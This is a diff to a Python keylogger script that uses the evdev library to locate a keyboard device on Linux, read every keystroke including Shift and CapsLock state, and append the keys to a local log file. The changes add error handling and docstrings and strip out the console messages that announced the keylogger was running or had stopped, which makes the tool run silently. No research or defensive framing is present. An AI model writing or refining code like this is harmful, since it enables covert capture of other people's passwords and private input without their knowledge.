@@ -1,17 +1,20 @@
+#!/usr/bin/env python3
 import evdev
 from evdev import ecodes
 import os
 
 class Keylogger:
-    def __init__(self, log_path="./data/captured_keys.txt"):  # FIXED: __init__
+    def __init__(self, log_path="./data/captured_keys.txt"):
         self.log_path = log_path
         self.modifiers = {
             'shift': False,
             'capslock': False
         }
+        # Ensure the directory exists
         os.makedirs(os.path.dirname(self.log_path), exist_ok=True)
     
     def find_keyboard(self):
+        """Find a valid keyboard device."""
         devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
         for device in devices:
             capabilities = device.capabilities()
@@ -22,18 +25,17 @@ class Keylogger:
         return None
 
     def update_modifiers(self, code, value):
+        """Updates the state of Shift and CapsLock."""
         if code in [ecodes.KEY_LEFTSHIFT, ecodes.KEY_RIGHTSHIFT]:
             self.modifiers['shift'] = (value == 1)
         elif code == ecodes.KEY_CAPSLOCK and value == 1:
             self.modifiers['capslock'] = not self.modifiers['capslock']
 
     def run(self):
+        """Starts the keylogging loop."""
         device = self.find_keyboard()
         if not device:
-            print("[!] Could not find a valid keyboard device.")
             return
-        
-        print(f"[*] Keylogger hooked: {device.name} ({device.path})")
         
         for event in device.read_loop():
             if event.type == ecodes.EV_KEY:
@@ -52,12 +54,20 @@ class Keylogger:
                         output += "[CAPS] "
                     output += f"{key_name} "
                     
-                    with open(self.log_path, "a") as f:
-                        f.write(output + "\n")
+                    # FIX: Ensure directory exists before each write
+                    try:
+                        os.makedirs(os.path.dirname(self.log_path), exist_ok=True)
+                        with open(self.log_path, "a") as f:
+                            f.write(output + "\n")
+                    except FileNotFoundError:
+                        # Directory was deleted, stop gracefully
+                        break
+                    except Exception:
+                        break
 
-if __name__ == "__main__":  # FIXED: __name__
+if __name__ == "__main__":
     logger = Keylogger()
     try:
         logger.run()
     except KeyboardInterrupt:
-        print("\n[*] Keylogger stopped.")
+        pass
